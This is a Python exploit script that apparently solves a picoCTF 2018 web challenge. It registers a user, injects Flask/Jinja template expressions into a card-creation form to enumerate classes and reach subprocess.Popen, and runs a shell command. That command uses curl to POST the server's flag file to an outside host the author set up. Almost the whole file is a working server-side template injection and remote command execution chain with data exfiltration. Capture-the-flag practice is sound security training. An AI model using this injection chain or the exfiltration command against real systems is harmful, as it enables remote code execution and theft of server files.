#!/usr/bin/env python
import requests
import re
import subprocess 

HOST = "2018shell3.picoctf.com"
PORT = "52168"
USERNAME = 'random_user'
PASSWORD = 'make_up_some_crap'

# Sometimes the requests return some invalid crap and the code doesn't know how to deal with it
# So the requests just retry until they succeed...

# Start session and get csrf token
client = requests.session()
r = client.get('http://{}:{}/register'.format(HOST, PORT))
csrf_token = re.findall('(?<=value=").{10,}(?=">)', r.text)[0]

# Register the user as given above
def register():
    print "Registering."

    # get session
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'password2': PASSWORD,
        'csrf_token': csrf_token
    }
    while True:
        try:
            client.post('http://{}:{}/register'.format(HOST, PORT), data=data)
        except:
            continue
        return

# Login session
def login():
    print "Logging in."
    # get session
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'csrf_token': csrf_token
    }
    while True:
        try:
            client.post('http://{}:{}/login'.format(HOST, PORT), data=data)
        except:
            continue
        return

# Subprocess is the exploit. Apparently, with Flask template injection, it's possible
# to enumerate all the classes that you have access to.
# this is what I do here, I find the index of the subprocess.Popen 'class'
# Then abuse the hell out of it for Remote Command Execution (RCE)
def getSubprocessId():
    print "Getting subprocess class index."
    subprocess_index = 0
    from HTMLParser import HTMLParser
    h = HTMLParser()
    data = {
    'question': "{{''.__class__.__mro__[1].__subclasses__()}}",
    'answer': 'a',
    'csrf_token': csrf_token
    }
    r = ""
    while True:
        try:
            client.post('http://{}:{}/create_card'.format(HOST, PORT), data=data)
            r = client.get('http://{}:{}/list_cards'.format(HOST, PORT))
        except:
            continue
        break        
    classes = h.unescape(re.findall('(?<=\[)&lt;.*&gt;(?=\])', r.text)[0]).split(',')
    for i, c in enumerate(classes):
        if 'subprocess.Popen' in c:
            subprocess_index = i
    return subprocess_index

# As described above, I run this code and push the flag to some online API I quickly built
# so I can extract it later with this script.
def exploit(subprocess_index):
    print "Exploiting."
    data = {
    'question': "{{{{''.__class__.__mro__[1].__subclasses__()[{}]('curl -X POST picoctf.getsandbox.com -d flag=$(cat flag)', shell=True)}}}}".format(subprocess_index),
    'answer': '',
    'csrf_token': csrf_token
    }
    while True:
        try:
            client.post('http://{}:{}/create_card'.format(HOST, PORT), data=data)
        except:
            continue
        break
    while True:
        try:
            client.get('http://{}:{}/list_cards'.format(HOST, PORT))
        except:
            continue
        break
    r = requests.get('http://picoctf.getsandbox.com')
    flags = re.findall('picoCTF{.*}', r.text)
    print '\n\nYOU GOT THE FLAG YAY!'
    print '\\o/       \\o/     \\o/                        \\o/'
    print flags[len(flags)-1]
    print '\\o/               \\o/          \\o/\n\n'
          
          

if __name__ == "__main__":
    register()
    login()
    exploit(getSubprocessId())